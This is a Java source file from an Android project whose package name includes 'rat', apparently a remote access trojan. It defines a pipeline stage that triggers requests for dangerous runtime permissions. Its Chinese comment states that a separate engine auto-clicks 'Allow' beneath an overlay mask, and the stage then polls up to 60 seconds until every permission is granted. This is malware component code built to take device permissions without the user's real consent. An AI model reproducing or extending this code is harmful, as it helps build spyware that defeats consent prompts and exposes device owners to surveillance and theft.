package com.vendor.rat.auto.pipeline.stage;

import android.util.Log;

import com.vendor.rat.activity.ActivMain;
import com.vendor.rat.auto.pipeline.PipelineContext;
import com.vendor.rat.auto.pipeline.PipelineStage;

/**
 * Stage 7: 请求运行时权限
 *
 * 触发 ActivMain 逐组请求危险权限。
 * PermissionAutoGrantEngine 在遮罩下自动点击"允许"。
 * 轮询等待所有权限授予（最多 60 秒）。
 */
public class PermissionRequestStage implements PipelineStage {

    private static final String TAG = "PermissionRequestStage";
    private static final long TIMEOUT_MS = 60_000;

    @Override
    public void handle(PipelineContext passable, Runnable next) {
        // Skip if all permissions already granted
        if (ActivMain.allPermissionsGranted()) {
            next.run();
            return;
        }

        // 清除中断标志
        Thread.interrupted();

        ActivMain.triggerPermissionRequest();
        Log.d(TAG, "Permission request triggered, polling for completion");

        long polls = TIMEOUT_MS / 500;
        for (int i = 0; i < polls; i++) {
            if (ActivMain.allPermissionsGranted()) {
                Log.d(TAG, "All permissions granted after " + (i * 500) + "ms");
                break;
            }
            try { Thread.sleep(500); } catch (InterruptedException ignored) { break; }
        }

        passable.setPermissionsGranted(ActivMain.allPermissionsGranted());
        if (!passable.isPermissionsGranted()) {
            Log.w(TAG, "Not all permissions granted after timeout");
        }
        next.run();
    }
}
